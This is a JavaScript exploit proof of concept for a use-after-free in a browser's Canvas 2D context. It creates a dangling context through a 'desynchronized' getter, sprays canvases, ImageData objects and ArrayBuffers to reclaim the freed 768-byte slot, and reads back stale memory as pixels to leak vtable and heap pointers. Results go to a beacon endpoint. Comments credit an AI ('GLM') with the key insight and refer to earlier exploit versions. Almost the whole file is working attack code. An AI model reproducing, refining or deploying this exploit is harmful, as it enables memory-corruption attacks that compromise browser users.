// p489 — Canvas UAF: ImageData 768-byte reclaim for pointer leak
//
// KEY INSIGHT (GLM): 192×1 ImageData backing = 192*4 = 768 bytes
// Same size class as freed CanvasRenderingContext2D.
// If ImageData backing reclaims the freed slot, getImageData() reads
// raw pointer values as RGBA pixels.
//
// Strategy:
//   Phase 1: Canvas UAF + same-type spray → confirm aliasing (proven baseline)
//   Phase 2: Free aliased context (null refs, remove DOM, GC)
//   Phase 3: Spray 192×1 ImageData objects to reclaim freed 768B slot
//   Phase 4: Read back via getImageData → check for non-zero pointer-like values
//
// SINGLE UAF ONLY — V486 proved second UAF crashes consistently.
//
// Beacon prefix: V489-
(function() {
  var BASE = location.protocol + '//' + location.host;
  var T0 = Date.now();
  var bQ = [];

  function Q(tag, body) { bQ.push([tag, body || '']); }
  function flushBeacons() {
    for (var i = 0; i < bQ.length; i++) {
      try {
        var x = new XMLHttpRequest();
        x.open('POST', BASE + '/beacon/V489-' + bQ[i][0], false);
        x.setRequestHeader('Content-Type', 'text/plain');
        x.send('[' + (Date.now() - T0) + 'ms] ' + bQ[i][1]);
      } catch(e) {}
    }
    bQ = [];
  }

  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/V489-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send('[' + (Date.now() - T0) + 'ms] ' + (body || ''));
    } catch(e) {}
  }

  B('BOOT', navigator.userAgent);

  // ═══════════════════════════════════════════════════════════
  // PHASE 1: Canvas UAF + Same-Type Spray (proven V482 baseline)
  // ═══════════════════════════════════════════════════════════
  var dCtx1 = null, lCtx1 = null;
  var tc1 = document.createElement('canvas');
  tc1.width = 10; tc1.height = 10;
  document.body.appendChild(tc1);

  var cc1 = 0, s1 = {};
  Object.defineProperty(s1, 'desynchronized', {
    get: function() { cc1++; if (cc1 === 1) dCtx1 = tc1.getContext('2d'); return false; }
  });
  lCtx1 = tc1.getContext('2d', s1);

  if (!dCtx1) { B('ABORT', 'uaf1-fail'); return; }

  // Same-type spray: 200 contexts with lineWidth = 500+i
  var sprayC = [], sprayX = [];
  for (var i = 0; i < 200; i++) {
    var c = document.createElement('canvas');
    c.width = 10; c.height = 10;
    sprayC.push(c);
    var ctx = c.getContext('2d');
    ctx.lineWidth = 500 + i;
    sprayX.push(ctx);
  }

  // Read lineWidth through dangling pointer
  var lw1 = dCtx1.lineWidth;
  if (typeof lw1 !== 'number' || lw1 < 500 || lw1 >= 700) {
    B('UAF1-MISS', 'lw=' + lw1);
    flushBeacons();
    return;
  }
  var idx1 = Math.round(lw1 - 500);
  B('UAF1-ALIAS', 'idx=' + idx1);

  // Verify bidirectional alias
  sprayX[idx1].lineWidth = 777.25;
  var bidir = dCtx1.lineWidth;
  if (bidir !== 777.25) {
    B('BIDIR-FAIL', 'wrote=777.25,read=' + bidir);
    flushBeacons();
    return;
  }
  Q('BIDIR-OK', 'idx=' + idx1);

  // ═══════════════════════════════════════════════════════════
  // PHASE 2: Free the aliased context
  //
  // Drop ALL references to spray[idx1]'s canvas + context.
  // The canvas element owns the context via unique_ptr.
  // When canvas is GC'd, context is deleted → 768B slot freed.
  // dCtx1's dangling Ref<> doesn't affect spray[idx1]'s ref count.
  // ═══════════════════════════════════════════════════════════

  // Remove canvas from DOM
  var aliasedCanvas = sprayC[idx1];
  if (aliasedCanvas && aliasedCanvas.parentNode) {
    aliasedCanvas.parentNode.removeChild(aliasedCanvas);
  }

  // Null all JS references
  sprayC[idx1] = null;
  sprayX[idx1] = null;
  aliasedCanvas = null;

  // GC pressure — multiple rounds
  for (var round = 0; round < 3; round++) {
    var junk = [];
    for (var g = 0; g < 3000; g++) {
      junk.push({a: new ArrayBuffer(64), b: [g]});
    }
    junk = null;
  }

  Q('GC-DONE', 'freed-idx=' + idx1);

  // ═══════════════════════════════════════════════════════════
  // PHASE 3: Spray 192×1 ImageData objects
  //
  // ImageData(192, 1) backing = 192 * 4 (RGBA) = 768 bytes.
  // Also spray 768-byte ArrayBuffers as fallback.
  //
  // Two approaches in parallel:
  // A) createImageData on a helper canvas → ImageData backing through canvas path
  // B) new ImageData(192, 1) → direct construction
  // C) ArrayBuffer(768) → raw buffer fallback
  // ═══════════════════════════════════════════════════════════

  var NUM_SPRAY = 200;

  // Approach A: createImageData via canvas
  var imgDataSprayA = [];
  var helperCanvas = document.createElement('canvas');
  helperCanvas.width = 192; helperCanvas.height = 1;
  var helperCtx = helperCanvas.getContext('2d');
  for (var i = 0; i < NUM_SPRAY; i++) {
    imgDataSprayA.push(helperCtx.createImageData(192, 1));
  }

  // Approach B: direct ImageData constructor
  var imgDataSprayB = [];
  for (var i = 0; i < NUM_SPRAY; i++) {
    try {
      imgDataSprayB.push(new ImageData(192, 1));
    } catch(e) {
      // ImageData constructor may not be available, use approach A only
      break;
    }
  }

  // Approach C: ArrayBuffer(768) fallback
  var abSpray = [];
  var abViews = [];
  for (var i = 0; i < NUM_SPRAY; i++) {
    var ab = new ArrayBuffer(768);
    abSpray.push(ab);
    abViews.push(new Uint8Array(ab));
  }

  Q('SPRAY-DONE', 'imgA=' + imgDataSprayA.length + ',imgB=' + imgDataSprayB.length + ',ab=' + abSpray.length);

  // ═══════════════════════════════════════════════════════════
  // PHASE 4: Scan ImageData for non-zero content (pointer leak)
  //
  // Fresh ImageData should be all zeros.
  // If one reclaimed the freed context slot, it contains stale pointer data.
  // ═══════════════════════════════════════════════════════════

  function scanImageData(imgData, label) {
    var data = imgData.data; // Uint8ClampedArray, length 768
    var nonZeroCount = 0;
    var firstNonZero = -1;
    var sampleBytes = [];

    for (var j = 0; j < data.length; j++) {
      if (data[j] !== 0) {
        nonZeroCount++;
        if (firstNonZero === -1) firstNonZero = j;
        if (sampleBytes.length < 32) {
          sampleBytes.push(j + ':' + ('0' + data[j].toString(16)).slice(-2));
        }
      }
    }

    if (nonZeroCount > 0) {
      Q(label + '-HIT', 'nz=' + nonZeroCount + ',first=' + firstNonZero);
      Q(label + '-BYTES', sampleBytes.join(','));

      // Dump pointer-sized values at key offsets
      // +0: vtable, +32: m_canvas, +96: m_stateStack.m_buffer
      var ptrOffsets = [0, 8, 16, 24, 32, 40, 48, 56, 64, 72, 80, 88, 96, 104];
      var ptrs = [];
      for (var p = 0; p < ptrOffsets.length; p++) {
        var off = ptrOffsets[p];
        if (off + 8 <= data.length) {
          var hex = '';
          for (var b = 7; b >= 0; b--) {
            hex += ('0' + data[off + b].toString(16)).slice(-2);
          }
          ptrs.push(off + ':0x' + hex);
        }
      }
      Q(label + '-PTRS', ptrs.join(','));

      // Full hex dump of first 128 bytes
      var hexDump = [];
      for (var h = 0; h < 128 && h < data.length; h++) {
        hexDump.push(('0' + data[h].toString(16)).slice(-2));
      }
      Q(label + '-HEX128', hexDump.join(''));

      return true;
    }
    return false;
  }

  // Scan approach A (createImageData)
  var hitsA = 0;
  for (var i = 0; i < imgDataSprayA.length; i++) {
    if (scanImageData(imgDataSprayA[i], 'IMGA-' + i)) {
      hitsA++;
      if (hitsA >= 3) break; // Don't flood beacons
    }
  }
  Q('IMGA-TOTAL', 'hits=' + hitsA + '/' + imgDataSprayA.length);

  // Scan approach B (new ImageData)
  var hitsB = 0;
  for (var i = 0; i < imgDataSprayB.length; i++) {
    if (scanImageData(imgDataSprayB[i], 'IMGB-' + i)) {
      hitsB++;
      if (hitsB >= 3) break;
    }
  }
  Q('IMGB-TOTAL', 'hits=' + hitsB + '/' + imgDataSprayB.length);

  // Scan approach C (ArrayBuffer)
  var hitsC = 0;
  for (var i = 0; i < abSpray.length; i++) {
    var view = abViews[i];
    var nz = 0;
    for (var j = 0; j < view.length; j++) {
      if (view[j] !== 0) { nz++; }
    }
    if (nz > 0) {
      hitsC++;
      // Dump pointer values at key offsets
      var dv = new DataView(abSpray[i]);
      var ptrs = [];
      var ptrOffsets = [0, 8, 16, 24, 32, 40, 48, 56, 64, 72, 80, 88, 96, 104];
      for (var p = 0; p < ptrOffsets.length; p++) {
        var off = ptrOffsets[p];
        var lo = dv.getUint32(off, true);
        var hi = dv.getUint32(off + 4, true);
        ptrs.push(off + ':0x' + ('00000000' + hi.toString(16)).slice(-8) + ('00000000' + lo.toString(16)).slice(-8));
      }
      Q('AB-' + i + '-HIT', 'nz=' + nz);
      Q('AB-' + i + '-PTRS', ptrs.join(','));

      if (hitsC >= 3) break;
    }
  }
  Q('AB-TOTAL', 'hits=' + hitsC + '/' + abSpray.length);

  // ═══════════════════════════════════════════════════════════
  // PHASE 5: Also try reading through danglingCtx directly
  //
  // If an AB or ImageData reclaimed the slot, the m_stateStack is zeroed.
  // DON'T read lineWidth (CrashOnOverflow if m_size=0).
  // But we CAN try save() — increments m_unrealizedSaveCount.
  // Then scan ABs for the marker.
  // ═══════════════════════════════════════════════════════════

  var saveOk = false;
  try {
    dCtx1.save();
    saveOk = true;
  } catch(e) {
    Q('SAVE-ERR', e.message || String(e));
  }
  Q('SAVE-RESULT', 'ok=' + saveOk);

  // If save worked, scan ABs for the marker at candidate offsets
  if (saveOk) {
    var markerHits = [];
    var offsets = [584, 588, 592, 596, 600, 604, 608, 612, 616, 620, 624, 628, 632, 636, 640];
    for (var ai = 0; ai < abSpray.length; ai++) {
      var dv = new DataView(abSpray[ai]);
      for (var oi = 0; oi < offsets.length; oi++) {
        var val = dv.getUint32(offsets[oi], true);
        if (val === 1) {
          markerHits.push('ab=' + ai + ',off=' + offsets[oi]);
        }
      }
    }
    Q('SAVE-MARKER', 'hits=' + markerHits.length + ':' + markerHits.slice(0, 10).join(';'));

    // Also scan ImageData approach A for save marker
    var imgMarkerHits = [];
    for (var ii = 0; ii < imgDataSprayA.length; ii++) {
      var d = imgDataSprayA[ii].data;
      for (var oi = 0; oi < offsets.length; oi++) {
        var off = offsets[oi];
        if (off + 4 <= d.length) {
          // Read uint32 LE from Uint8ClampedArray
          var val = d[off] | (d[off+1] << 8) | (d[off+2] << 16) | (d[off+3] << 24);
          if ((val >>> 0) === 1) {
            imgMarkerHits.push('img=' + ii + ',off=' + off);
          }
        }
      }
    }
    Q('SAVE-IMG-MARKER', 'hits=' + imgMarkerHits.length + ':' + imgMarkerHits.slice(0, 10).join(';'));
  }

  Q('DONE', 'hitsA=' + hitsA + ',hitsB=' + hitsB + ',hitsC=' + hitsC + ',save=' + saveOk);

  flushBeacons();
})();
